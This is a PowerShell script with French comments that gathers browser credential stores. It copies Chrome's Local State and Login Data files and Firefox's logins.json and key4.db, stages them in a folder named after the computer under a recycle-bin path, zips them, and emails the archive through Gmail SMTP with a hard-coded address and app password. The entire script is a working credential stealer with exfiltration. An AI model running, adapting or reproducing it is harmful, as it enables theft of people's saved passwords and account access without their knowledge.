# Fonction pour copier les fichiers par profil
function Copy-ProfileFiles {
    param (
        [string]$BasePath,
        [string[]]$FileNames,
        [string]$DestinationBase,
        [scriptblock]$ProfileFilter = { $true } # Filtre par défaut : inclut tous les dossiers
    )

    if (Test-Path $BasePath) {
        $profiles = Get-ChildItem -Path $BasePath -Directory | Where-Object { & $ProfileFilter $_ }
        foreach ($profile in $profiles) {
            $destinationPath = Join-Path -Path $DestinationBase -ChildPath $profile.Name
            New-Item -ItemType Directory -Path $destinationPath -Force | Out-Null

            foreach ($file in $FileNames) {
                $sourceFile = Join-Path -Path $profile.FullName -ChildPath $file
                if (Test-Path $sourceFile) {
                    $destinationFile = Join-Path -Path $destinationPath -ChildPath $file
                    Copy-Item -Path $sourceFile -Destination $destinationFile -Force
                    Write-Host "Fichier copié : $sourceFile -> $destinationFile"
                } else {
                    Write-Host "Fichier manquant : $sourceFile"
                }
            }
        }
    } else {
        Write-Host "Chemin introuvable : $BasePath"
    }
}

# Fonction pour envoyer le fichier ZIP par email
function Send-Email {
    param (
        [string]$filePath,
        [string]$smtpServer,
        [string]$smtpPort,
        [string]$smtpFrom,
        [string]$smtpTo,
        [string]$subject,
        [string]$body,
        [string]$smtpUser,
        [string]$smtpPassword
    )

    $smtp = New-Object Net.Mail.SmtpClient($smtpServer)
    $smtp.Port = $smtpPort
    $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPassword)
    $smtp.EnableSsl = $true

    $mailMessage = New-Object Net.Mail.MailMessage
    $mailMessage.From = $smtpFrom
    $mailMessage.To.Add($smtpTo)
    $mailMessage.Subject = $subject
    $mailMessage.Body = $body
    $mailMessage.Attachments.Add($filePath)  # Attachement du fichier

    try {
        $smtp.Send($mailMessage)
        Write-Host "Email envoyé avec succès."
    } catch {
        Write-Host "Erreur lors de l'envoi de l'email : $_"
    }
}

# Chemin vers la corbeille
$recycleBinPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('LocalApplicationData'), 'Microsoft\Windows\Explorer\RecycleBin')

# Récupérer le nom de l'ordinateur
$computerName = $env:COMPUTERNAME

# Créer le dossier CouCou avec le nom de l'ordinateur dans la corbeille
$coucouFolder = Join-Path -Path $recycleBinPath -ChildPath "CouCou_$computerName"
$chromeFolder = Join-Path -Path $coucouFolder -ChildPath "Chrome"
$firefoxFolder = Join-Path -Path $coucouFolder -ChildPath "Firefox"

# Création des dossiers de destination dans la corbeille
New-Item -ItemType Directory -Path $chromeFolder -Force | Out-Null
New-Item -ItemType Directory -Path $firefoxFolder -Force | Out-Null

# Google Chrome
Write-Host "`n--- Copie des fichiers Google Chrome ---"

# Copie du fichier Local State unique
$chromeLocalState = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -ChildPath "Local State"
$chromeLocalStateDestination = Join-Path -Path $chromeFolder -ChildPath "Local State"
if (Test-Path $chromeLocalState) {
    Copy-Item -Path $chromeLocalState -Destination $chromeLocalStateDestination -Force
    Write-Host "Fichier Local State copié : $chromeLocalState -> $chromeLocalStateDestination"
} else {
    Write-Host "Fichier Local State manquant : $chromeLocalState"
}

# Copie des fichiers Login Data par profil avec filtre pour les vrais profils
Copy-ProfileFiles -BasePath "$env:LOCALAPPDATA\Google\Chrome\User Data" `
                  -FileNames @("Login Data") `
                  -DestinationBase $chromeFolder `
                  -ProfileFilter {
                      # Filtre pour inclure uniquement "Default" et "Profile *"
                      $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$"
                  }

# Mozilla Firefox
Write-Host "`n--- Copie des fichiers Mozilla Firefox ---"
Copy-ProfileFiles -BasePath "$env:APPDATA\Mozilla\Firefox\Profiles" -FileNames @("logins.json", "key4.db") -DestinationBase $firefoxFolder

Write-Host "`nTous les fichiers ont été copiés dans : $coucouFolder"

# Compression du dossier CouCou avec le nom de l'ordinateur dans la corbeille
$zipFile = Join-Path -Path $recycleBinPath -ChildPath "CouCou_$computerName.zip"
Write-Host "`nCompression du dossier CouCou en fichier ZIP..."
Compress-Archive -Path $coucouFolder -DestinationPath $zipFile -Force
Write-Host "Fichier ZIP créé dans la corbeille : $zipFile"

# Paramètres de l'email
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$smtpFrom = "tinoute1234@gmail.com"  # Ton adresse Gmail
$smtpTo = "tinoute1234@gmail.com"  # L'adresse où tu veux envoyer le mail
$subject = "Fichier CouCou Compressé"
$body = "Voici le fichier CouCou compressé."
$smtpUser = "tinoute1234@gmail.com"  # Ton adresse Gmail
$smtpPassword = "pygf amkw vtnq nbtl"  # Utilise un mot de passe d'application si nécessaire

# Envoi de l'email avec le fichier ZIP en pièce jointe
Send-Email -filePath $zipFile `
           -smtpServer $smtpServer `
           -smtpPort $smtpPort `
           -smtpFrom $smtpFrom `
           -smtpTo $smtpTo `
           -subject $subject `
           -body $body `
           -smtpUser $smtpUser `
           -smtpPassword $smtpPassword

Write-Host "`nOpération terminée."
